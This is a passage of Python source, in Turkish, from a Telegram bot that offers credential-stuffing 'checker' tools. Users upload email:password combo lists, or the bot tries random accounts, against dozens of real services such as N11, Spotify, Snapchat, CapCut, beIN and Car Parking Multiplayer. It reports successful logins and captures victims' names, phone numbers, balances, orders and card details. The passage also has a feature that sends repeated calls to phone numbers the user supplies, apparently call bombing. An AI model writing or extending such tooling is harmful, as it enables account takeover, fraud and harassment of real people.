  elif call.data == "candy_stop":
    job = active_candy_jobs.get(user_id)
    if not job:
      safe_answer("Aktif CANDY yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    active_candy_jobs[user_id] = job
    safe_answer("🛑 CANDY durduruluyor...")
    try:
      bot.send_message(chat_id, f"🛑 **CANDY CRUSH durduruluyor...** {job.get('checked', 0)}/{job.get('total', 0)} · HIT {job.get('hits', 0)}", parse_mode="Markdown")
    except Exception:
      pass

  elif call.data == "kurumedy_stop":
    job = active_kurumedy_jobs.get(user_id)
    if not job:
      safe_answer("Aktif KURUMEDYA yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    active_kurumedy_jobs[user_id] = job
    safe_answer("🛑 KURUMEDYA durduruluyor...")
    try:
      bot.send_message(chat_id, f"🛑 **KURUMEDYA durduruluyor...** {job.get('checked', 0)}/{job.get('total', 0)} · HIT {job.get('hits', 0)}", parse_mode="Markdown")
    except Exception:
      pass

  elif call.data == "smmturk_stop":
    job = active_smmturk_jobs.get(user_id)
    if not job:
      safe_answer("Aktif SMMTÜRK yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    active_smmturk_jobs[user_id] = job
    safe_answer("🛑 SMMTÜRK durduruluyor...")
    try:
      bot.send_message(chat_id, f"🛑 **SMMTÜRK durduruluyor...** {job.get('checked', 0)}/{job.get('total', 0)} · HIT {job.get('hits', 0)}", parse_mode="Markdown")
    except Exception:
      pass

  elif call.data in (
    "smpanel_stop", "worldofsmm_stop", "jap_stop", "vpazari_stop",
    "predunyam_stop", "mackolik_stop", "ozygame_stop", "capcut_stop",
    "verisunucu_stop", "smsonay_stop", "fenix_stop", "ezglobal_stop",
    "epinfy_stop", "spotify_stop", "snapchat_stop",
    "medyabayim_stop", "bkm_stop", "barlas_stop", "idefix_stop",
    "oyuncustore_stop", "oyundinar_stop", "smsonaycom_stop",
    "todtv_stop", "bein_stop", "ssport_stop", "tabii_stop",
    "crunchyroll_stop",
  ):
    mapping = {
      "smpanel_stop": ("active_smpanel_jobs", "SMPANEL"),
      "worldofsmm_stop": ("active_worldofsmm_jobs", "WORLDOFSMM"),
      "jap_stop": ("active_jap_jobs", "JAP"),
      "vpazari_stop": ("active_vpazari_jobs", "VPAZARI"),
      "predunyam_stop": ("active_predunyam_jobs", "PREDUNYAM"),
      "mackolik_stop": ("active_mackolik_jobs", "MACKOLIK"),
      "ozygame_stop": ("active_ozygame_jobs", "OZYGAME"),
      "capcut_stop": ("active_capcut_jobs", "CAPCUT"),
      "verisunucu_stop": ("active_verisunucu_jobs", "VERISUNUCU"),
      "smsonay_stop": ("active_smsonay_jobs", "SMSONAY"),
      "fenix_stop": ("active_fenix_jobs", "FENIX"),
      "ezglobal_stop": ("active_ezglobal_jobs", "EZGLOBAL"),
      "epinfy_stop": ("active_epinfy_jobs", "EPINFY"),
      "spotify_stop": ("active_spotify_jobs", "SPOTIFY"),
      "snapchat_stop": ("active_snapchat_jobs", "SNAPCHAT"),
      "medyabayim_stop": ("active_medyabayim_jobs", "MEDYABAYIM"),
      "bkm_stop": ("active_bkm_jobs", "BKM"),
      "barlas_stop": ("active_barlas_jobs", "BARLAS"),
      "idefix_stop": ("active_idefix_jobs", "IDEFIX"),
      "oyuncustore_stop": ("active_oyuncustore_jobs", "OYUNCUSTORE"),
      "oyundinar_stop": ("active_oyundinar_jobs", "OYUNDINAR"),
      "smsonaycom_stop": ("active_smsonaycom_jobs", "SMSONAY.COM"),
      "todtv_stop": ("active_todtv_jobs", "TODTV"),
      "bein_stop": ("active_bein_jobs", "BEIN"),
      "ssport_stop": ("active_ssport_jobs", "SSPORT"),
      "tabii_stop": ("active_tabii_jobs", "TABII"),
      "crunchyroll_stop": ("active_crunchyroll_jobs", "CRUNCHYROLL"),
    }
    dname, label = mapping[call.data]
    job = globals().get(dname, {}).get(user_id)
    if not job:
      safe_answer(f"Aktif {label} yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    globals()[dname][user_id] = job
    safe_answer(f"🛑 {label} durduruluyor...")
    try:
      bot.send_message(chat_id, f"🛑 **{label} durduruluyor...** {job.get('checked', 0)}/{job.get('total', 0)} · HIT {job.get('hits', 0)}", parse_mode="Markdown")
    except Exception:
      pass

  elif call.data in ("n11_show_hits", "n11_show_susp", "n11_show_err", "n11_show_live"):
    job = active_n11_jobs.get(user_id)
    if not job:
      safe_answer("Aktif/son tarama yok. Yeni tarama başlat.", show_alert=True)
      return
    safe_answer()
    if call.data == "n11_show_hits":
      details = job.get("hit_details") or []
      if not details:
        bot.send_message(chat_id, "📭 Henüz HIT yok.")
      else:
        chunk = details[-15:]
        bot.send_message(
          chat_id,
          f"✅ **HIT detayları** ({len(details)} toplam, son {len(chunk)}):\n\n"
          + "\n\n".join(chunk),
          parse_mode="Markdown",
        )
    elif call.data == "n11_show_susp":
      details = job.get("susp_details") or []
      if not details:
        bot.send_message(chat_id, "📭 Askı/kilit kaydı yok.")
      else:
        bot.send_message(
          chat_id,
          f"⚠ **Askı / kilit (API):**\n\n" + "\n\n".join(details[-20:]),
          parse_mode="Markdown",
        )
    elif call.data == "n11_show_err":
      details = job.get("err_details") or []
      if not details:
        bot.send_message(chat_id, "📭 Hata kaydı yok.")
      else:
        bot.send_message(
          chat_id,
          f"⚡ **Hatalar (API):**\n\n" + "\n\n".join(details[-20:]),
          parse_mode="Markdown",
        )
    else:
      live = job.get("live_log") or []
      if not live:
        bot.send_message(chat_id, "📭 Henüz olay yok.")
      else:
        bot.send_message(
          chat_id,
          "📋 **Son olaylar:**\n\n" + "\n".join(live[-20:]),
          parse_mode="Markdown",
        )
    return

  elif call.data == "n11_stop":
    job = active_n11_jobs.get(user_id)
    if not job:
      safe_answer("Aktif N11 taraması yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    active_n11_jobs[user_id] = job
    safe_answer("🛑 N11 durduruluyor...")
    try:
      bot.send_message(
        chat_id,
        f"🛑 **N11 durduruluyor...**\n"
        f"Şu ana: kontrol **{job.get('checked', 0)}** · HIT **{job.get('hits', 0)}**",
        parse_mode="Markdown",
      )
    except Exception:
      pass

  elif call.data == "tool_telz":
    safe_answer()
    if not feature_telz_enabled and user_id not in admin_ids_set:
      bot.send_message(
        chat_id,
        "🔧 **CALL (TELZ) şu an bakımda.**\n\n"
        "Lütfen daha sonra tekrar dene.",
        parse_mode="Markdown",
      )
      return
    user_states[chat_id] = "waiting_telz_numbers"
    max_t = telz_max_times_for(user_id)
    times_txt = "sınırsız (admin)" if max_t is None else f"1–{max_t}"
    maint_note = "\n⚠️ Admin: özellik şu an bakımda (kullanıcılar göremez)." if not feature_telz_enabled else ""
    bot.send_message(
      chat_id,
      "📞 **Telz Call** — Adım 1/2\n\n"
      "Numaraları gönder (her satıra 1 numara).\n"
      f"Örnek:\n`+905xxxxxxxxx`\n`05xxxxxxxxx`\n\n"
      f"📦 Max **{TELZ_MAX_NUMBERS}** numara\n"
      f"🔁 Sonra kaç kere göndermek istediğini soracağım ({times_txt})"
      f"{maint_note}\n\n"
      f"İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_ai_chat":
    safe_answer()
    active_ai_chat.add(user_id)
    user_states[chat_id] = "ai_chat"
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("🗑️ Sohbeti Temizle", callback_data="ai_clear"),
      types.InlineKeyboardButton("🚪 Çık", callback_data="ai_exit"),
    )
    bot.send_message(
      chat_id,
      "🤖 **AI Sohbet** (ücretsiz)\n\n"
      "Mesajını yaz, cevaplayayım.\n"
      "Çıkmak: buton veya `/ai_cikis`",
      reply_markup=markup,
      parse_mode="Markdown",
    )

  elif call.data == "tool_ai_nsfw":
    safe_answer()
    active_ai_chat.add(user_id)
    user_states[chat_id] = "ai_chat_nsfw"
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("🗑️ Sohbeti Temizle", callback_data="ai_clear_nsfw"),
      types.InlineKeyboardButton("🚪 Çık", callback_data="ai_exit"),
    )
    bot.send_message(
      chat_id,
      "🔥 **AI +18 Sohbet**\n\n"
      "⚠️ Sadece **18+** yetişkinler içindir.\n"
      "Açık / erotik sohbet yazabilirsin.\n"
      "Çıkmak: buton veya `/ai_cikis`",
      reply_markup=markup,
      parse_mode="Markdown",
    )

  elif call.data == "ai_clear":
    safe_answer("Temizlendi")
    ai_clear_session(user_id, "normal")
    bot.send_message(chat_id, "🗑️ Normal AI geçmişi silindi.")

  elif call.data == "ai_clear_nsfw":
    safe_answer("Temizlendi")
    ai_clear_session(user_id, "nsfw")
    bot.send_message(chat_id, "🗑️ +18 sohbet geçmişi silindi.")

  elif call.data == "ai_exit":
    safe_answer()
    active_ai_chat.discard(user_id)
    user_states.pop(chat_id, None)
    bot.send_message(chat_id, "👋 AI sohbet kapandı.")

  elif call.data == "tool_n11":
    safe_answer()
    if user_id in active_n11_jobs and not active_n11_jobs[user_id].get("stop"):
      j = active_n11_jobs[user_id]
      bot.send_message(
        chat_id,
        f"⚠️ Aktif N11 taraması var.\n"
        f"Kontrol: {j.get('checked', 0)}/{j.get('total', 0)} · HIT: {j.get('hits', 0)}\n"
        f"Durdurmak için paneldeki butonu kullan.",
        parse_mode="Markdown",
      )
      return
    user_states[chat_id] = "waiting_n11"
    bot.send_message(
      chat_id,
      "🛒 **N11 CHECKER**\n\n"
      "Format: `email:şifre` (tek veya çok satır)\n"
      "veya 📎 **.txt combo** dosyası gönder.\n\n"
      "✅ HIT = giriş OK + en az 1 sipariş\n"
      "Capture: isim, şehir, sipariş sayısı, tutar, kart\n\n"
      "İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_cpm":
    safe_answer()
    if user_id in active_cpm_jobs and not active_cpm_jobs[user_id].get("stop"):
      j = active_cpm_jobs[user_id]
      bot.send_message(
        chat_id,
        "⚠️ Zaten bir tarama var.\n"
        f"🔍 {j.get('checked', 0)}/{j.get('total', 0)} · "
        f"✅ {j.get('hits', 0)} · ❌ {j.get('bads', 0)}\n"
        "Durdur: paneldeki buton veya /durdur",
        parse_mode="Markdown",
      )
      return
    user_states[chat_id] = "waiting_cpm"
    bot.send_message(
      chat_id,
      "🎮 **CPM Checker** (Car Parking Multiplayer)\n\n"
      "Şunlardan birini gönder:\n"
      "• **Metin:** her satıra `email:şifre`\n"
      "• **📄 .txt dosyası** (combo) — 📎 dosya olarak ekle\n\n"
      "📦 **Limit yok**\n"
      "📊 Tarama sırasında **canlı panel** (HIT/BAD/kontrol)\n"
      "🛑 İstediğin an **Durdur** butonu veya `/durdur`\n"
      "✅ HIT'ler **.txt** olarak gelir\n\n"
      "İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_cpmv2":
    safe_answer()
    if user_id in active_cpmv2_jobs and not active_cpmv2_jobs[user_id].get("stop"):
      j = active_cpmv2_jobs[user_id]
      bot.send_message(
        chat_id,
        f"⚠️ CPM 2 zaten çalışıyor.\n"
        f"Mod: {j.get('mode_label', '?')} · HIT: {j.get('hits', 0)} · Denenen: {j.get('checked', 0)}",
        parse_mode="Markdown",
      )
      return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("⚡ Hızlı (12 worker · rate bekleme yok)", callback_data="tool_cpmv2_fast"),
      types.InlineKeyboardButton("🛡️ Güvenli (4 worker · rate-limit koruma)", callback_data="tool_cpmv2_safe"),
      types.InlineKeyboardButton("📄 Combo (kendi listeni yükle)", callback_data="tool_cpmv2_combo"),
      types.InlineKeyboardButton("🔙 Checker Menü", callback_data="menu_checker"),
    )
    bot.send_message(
      chat_id,
      "🎮 **CPM 2** — mod seç\n\n"
      "⚡ **Hızlı:** random · rate bekleme yok\n"
      "🛡️ **Güvenli:** random · rate-limit korumalı\n"
      "📄 **Combo:** kendi `email:şifre` listen\n\n"
      "HIT gelince yazar · Durdur panelde",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data in ("tool_cpmv2_fast", "tool_cpmv2_safe"):
    safe_answer()
    if user_id in active_cpmv2_jobs and not active_cpmv2_jobs[user_id].get("stop"):
      j = active_cpmv2_jobs[user_id]
      bot.send_message(
        chat_id,
        f"⚠️ CPM 2 zaten çalışıyor.\nHIT: {j.get('hits', 0)} · Denenen: {j.get('checked', 0)}",
        parse_mode="Markdown",
      )
      return
    mode = "fast" if call.data.endswith("_fast") else "safe"
    label = CPM_V2_MODES[mode]["label"]
    try:
      track_checker_use(user_id)
    except Exception:
      pass
    bot.send_message(
      chat_id,
      f"🎮 **CPM 2 — {label}** başlıyor\n"
      f"Combo yok — random hesap deneniyor\n"
      f"HIT gelince buraya yazılır\n"
      f"🛑 Durdur butonu panelde",
      parse_mode="Markdown",
    )
    threading.Thread(
      target=run_cpmv2_auto,
      args=(chat_id, user_id, mode),
      daemon=True,
    ).start()
    return

  elif call.data == "tool_cpmv2_combo":
    safe_answer()
    if user_id in active_cpmv2_jobs and not active_cpmv2_jobs[user_id].get("stop"):
      j = active_cpmv2_jobs[user_id]
      bot.send_message(
        chat_id,
        f"⚠️ CPM 2 zaten çalışıyor.\nHIT: {j.get('hits', 0)} · Denenen: {j.get('checked', 0)}",
        parse_mode="Markdown",
      )
      return
    user_states[chat_id] = "waiting_cpmv2"
    bot.send_message(
      chat_id,
      "📄 **CPM 2 Combo**\n\n"
      "Metin veya 📎 `.txt` gönder\n"
      "Format: `email:şifre` (satır satır)\n"
      "HIT: Araba · Win · Max Drift\n"
      "🛑 Durdur butonu var\n\n"
      "İptal: /iptal",
      parse_mode="Markdown",
    )
    return

  elif call.data == "tool_s2gepin":
    safe_answer()
    if user_id in active_s2gepin_jobs and not active_s2gepin_jobs[user_id].get("stop"):
      j = active_s2gepin_jobs[user_id]
      bot.send_message(chat_id, f"⚠️ Aktif S2GEPIN: {j.get('checked', 0)}/{j.get('total', 0)}", parse_mode="Markdown")
      return
    user_states[chat_id] = "waiting_s2gepin"
    bot.send_message(
      chat_id,
      "💎 **S2GEPIN Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "💰 SUCCESS = bakiye > 0 · 🟡 CUSTOM = 0 TL\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_penti":
    safe_answer()
    if user_id in active_penti_jobs and not active_penti_jobs[user_id].get("stop"):
      j = active_penti_jobs[user_id]
      bot.send_message(chat_id, f"⚠️ Aktif PENTI: {j.get('checked', 0)}/{j.get('total', 0)}", parse_mode="Markdown")
      return
    user_states[chat_id] = "waiting_penti"
    bot.send_message(
      chat_id,
      "👗 **PENTI Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: isim · telefon · doğum · puan · üyelik\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_candy":
    safe_answer()
    if user_id in active_candy_jobs and not active_candy_jobs[user_id].get("stop"):
      j = active_candy_jobs[user_id]
      bot.send_message(chat_id, f"⚠️ Aktif CANDY: {j.get('checked', 0)}/{j.get('total', 0)}", parse_mode="Markdown")
      return
    user_states[chat_id] = "waiting_candy"
    bot.send_message(
      chat_id,
      "🍬 **Candy Crush Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: user ID + mail onay\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_kurumedy":
    safe_answer()
    if user_id in active_kurumedy_jobs and not active_kurumedy_jobs[user_id].get("stop"):
      j = active_kurumedy_jobs[user_id]
      bot.send_message(chat_id, f"⚠️ Aktif KURUMEDYA: {j.get('checked', 0)}/{j.get('total', 0)}", parse_mode="Markdown")
      return
    user_states[chat_id] = "waiting_kurumedy"
    bot.send_message(
      chat_id,
      "📰 **Kurumedy Checker** (kurumedya.com)\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: kullanıcı · bakiye · harcama · status\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_smmturk":
    safe_answer()
    if user_id in active_smmturk_jobs and not active_smmturk_jobs[user_id].get("stop"):
      j = active_smmturk_jobs[user_id]
      bot.send_message(chat_id, f"⚠️ Aktif SMMTÜRK: {j.get('checked', 0)}/{j.get('total', 0)}", parse_mode="Markdown")
      return
    user_states[chat_id] = "waiting_smmturk"
    bot.send_message(
      chat_id,
      "📈 **SMMTürk Checker** (smmturk.org)\n\n"
      "Metin veya 📎 `.txt` gönder (`user:şifre`)\n"
      "HIT: kullanıcı · bakiye · harcama\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_smpanel":
    safe_answer()
    if user_id in active_smpanel_jobs and not active_smpanel_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif SMPANEL var.", parse_mode="Markdown"); return
    user_states[chat_id] = "waiting_smpanel"
    bot.send_message(
      chat_id,
      "📡 **SMPanel Checker** (smpanel.net)\n\n"
      "Metin veya 📎 `.txt` gönder (`user:şifre`)\n"
      "HIT: bakiye · harcama · status\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_worldofsmm":
    safe_answer()
    if user_id in active_worldofsmm_jobs and not active_worldofsmm_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif WORLDOFSMM var.", parse_mode="Markdown"); return
    user_states[chat_id] = "waiting_worldofsmm"
    bot.send_message(
      chat_id,
      "🌍 **WorldOfSMM Checker** (worldofsmm.com)\n\n"
      "Metin veya 📎 `.txt` gönder (`user:şifre`)\n"
      "HIT: bakiye · harcanan\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_jap":
    safe_answer()
    if user_id in active_jap_jobs and not active_jap_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif JAP var.", parse_mode="Markdown"); return
    user_states[chat_id] = "waiting_jap"
    bot.send_message(
      chat_id,
      "🟣 **JustAnotherPanel Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`user:şifre`)\n"
      "HIT: kullanıcı · orders · balance\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_vpazari":
    safe_answer()
    if user_id in active_vpazari_jobs and not active_vpazari_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif VPAZARI var.", parse_mode="Markdown"); return
    user_states[chat_id] = "waiting_vpazari"
    bot.send_message(
      chat_id,
      "🛒 **VPazari Checker** (vpazari.com)\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: cüzdan · sipariş\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_predunyam":
    safe_answer()
    if user_id in active_predunyam_jobs and not active_predunyam_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif PREDUNYAM var."); return
    user_states[chat_id] = "waiting_predunyam"
    bot.send_message(
      chat_id,
      "🎯 **Predunyam Checker** (predunyam.net)\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: kullanıcı · bakiye · sipariş\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_mackolik":
    safe_answer()
    if user_id in active_mackolik_jobs and not active_mackolik_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif MACKOLIK var."); return
    user_states[chat_id] = "waiting_mackolik"
    bot.send_message(
      chat_id,
      "⚽ **Mackolik Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: kullanıcı · ad soyad · onay\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_ozygame":
    safe_answer()
    if user_id in active_ozygame_jobs and not active_ozygame_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif OZYGAME var."); return
    user_states[chat_id] = "waiting_ozygame"
    bot.send_message(
      chat_id,
      "🎮 **Ozygame Checker** (ozygame.com)\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: kullanıcı · bakiye\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_capcut":
    safe_answer()
    if user_id in active_capcut_jobs and not active_capcut_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif CAPCUT var."); return
    user_states[chat_id] = "waiting_capcut"
    bot.send_message(
      chat_id,
      "🎬 **CapCut Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: nick / login\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_verisunucu":
    safe_answer()
    if user_id in active_verisunucu_jobs and not active_verisunucu_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif VERISUNUCU var."); return
    user_states[chat_id] = "waiting_verisunucu"
    bot.send_message(
      chat_id,
      "🖥 **Verisunucu Checker** (verisunucu.net)\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: ad · kredi bakiye\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_smsonay":
    safe_answer()
    if user_id in active_smsonay_jobs and not active_smsonay_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif SMSONAY var."); return
    user_states[chat_id] = "waiting_smsonay"
    bot.send_message(
      chat_id,
      "📱 **SMS Onay Servisi Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: kullanıcı · bakiye\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_buraksmsonay":
    safe_answer()
    user_states[chat_id] = "waiting_buraksmsonay"
    bot.send_message(
      chat_id,
      "📲 **BurakSMSOnay Checker** (buraksmsonay.com.tr)\n\n"
      "Metin veya 📎 `.txt` gönder (`user:şifre` / `mail:pass`)\n"
      "HIT: giriş başarılı\n"
      "🛑 Durdur butonu var\n\n"
      "İptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "buraksmsonay_stop":
    safe_answer()
    if user_id in active_buraksmsonay_jobs:
      active_buraksmsonay_jobs[user_id]["stop"] = True
      bot.send_message(chat_id, "🛑 BurakSMSOnay durduruluyor...")
    else:
      bot.send_message(chat_id, "Aktif tarama yok.")

  elif call.data == "tool_fenix":
    safe_answer()
    if user_id in active_fenix_jobs and not active_fenix_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif FENIX var."); return
    user_states[chat_id] = "waiting_fenix"
    bot.send_message(
      chat_id,
      "🔥 **Fenix Oyun Checker** (fenixoyun.com)\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: ad · bakiye\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_ezglobal":
    safe_answer()
    if user_id in active_ezglobal_jobs and not active_ezglobal_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif EZGLOBAL var."); return
    user_states[chat_id] = "waiting_ezglobal"
    bot.send_message(
      chat_id,
      "💼 **Ezglobal Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: isim · tel · bakiye\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_epinfy":
    safe_answer()
    if user_id in active_epinfy_jobs and not active_epinfy_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif EPINFY var."); return
    user_states[chat_id] = "waiting_epinfy"
    bot.send_message(
      chat_id,
      "🛒 **Epinfy Checker** (epinfy.com)\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: ad · bakiye\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_spotify":
    safe_answer()
    if user_id in active_spotify_jobs and not active_spotify_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif SPOTIFY-VM var."); return
    user_states[chat_id] = "waiting_spotify"
    bot.send_message(
      chat_id,
      "🎵 **Spotify VM Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: email kayıtlı mı (şifre doğrulanmaz)\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_snapchat":
    safe_answer()
    if user_id in active_snapchat_jobs and not active_snapchat_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif SNAPCHAT-VM var."); return
    user_states[chat_id] = "waiting_snapchat"
    bot.send_message(
      chat_id,
      "👻 **Snapchat VM Checker**\n\n"
      "Metin veya 📎 `.txt` gönder (`email:şifre`)\n"
      "HIT: email var mı / user id (şifre doğrulanmaz)\n"
      "🛑 Durdur butonu var\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "tool_medyabayim":
    safe_answer()
    if user_id in active_medyabayim_jobs and not active_medyabayim_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif MEDYABAYIM var."); return
    user_states[chat_id] = "waiting_medyabayim"
    bot.send_message(chat_id, "📺 **MedyaBayim Checker** (medyabayim.com)\n\nMetin veya 📎 `.txt` gönder (`user:şifre`)\nHIT: bakiye\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_bkm":
    safe_answer()
    if user_id in active_bkm_jobs and not active_bkm_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif BKM var."); return
    user_states[chat_id] = "waiting_bkm"
    bot.send_message(chat_id, "📚 **BKM Kitap Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: isim · kayıt tarihi\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_barlas":
    safe_answer()
    if user_id in active_barlas_jobs and not active_barlas_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif BARLAS var."); return
    user_states[chat_id] = "waiting_barlas"
    bot.send_message(chat_id, "📣 **Barlas Medya Checker**\n\nMetin veya 📎 `.txt` gönder (`user:şifre`)\nHIT: login OK\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_idefix":
    safe_answer()
    if user_id in active_idefix_jobs and not active_idefix_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif IDEFIX var."); return
    user_states[chat_id] = "waiting_idefix"
    bot.send_message(chat_id, "📖 **Idefix Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: ad soyad · sipariş\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_oyuncustore":
    safe_answer()
    if user_id in active_oyuncustore_jobs and not active_oyuncustore_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif OYUNCUSTORE var."); return
    user_states[chat_id] = "waiting_oyuncustore"
    bot.send_message(chat_id, "🕹 **OyuncuStore Checker**\n\nMetin veya 📎 `.txt` gönder (`user:şifre`)\nHIT: login OK\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_oyundinar":
    safe_answer()
    if user_id in active_oyundinar_jobs and not active_oyundinar_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif OYUNDINAR var."); return
    user_states[chat_id] = "waiting_oyundinar"
    bot.send_message(chat_id, "💎 **OyunDinar Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: bakiye\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_smsonaycom":
    safe_answer()
    if user_id in active_smsonaycom_jobs and not active_smsonaycom_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif SMSONAY.COM var."); return
    user_states[chat_id] = "waiting_smsonaycom"
    bot.send_message(chat_id, "📲 **SMS Onay.com Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: ad · bakiye · numara\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_todtv":
    safe_answer()
    if user_id in active_todtv_jobs and not active_todtv_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif TODTV var."); return
    user_states[chat_id] = "waiting_todtv"
    bot.send_message(chat_id, "📡 **TOD TV Checker**\n\nMetin veya 📎 `.txt` gönder (`email:şifre`)\nHIT: login / paket\n🛑 Durdur butonu var\n\nİptal: /iptal", parse_mode="Markdown")

  elif call.data == "tool_bein":
    safe_answer()
    if user_id in active_bein_jobs and not active_bein_jobs[user_id].get("stop"):
      bot.send_message(chat_id, "⚠️ Aktif BEIN var."); return
    user_states[chat_id] = "waiting_bein"
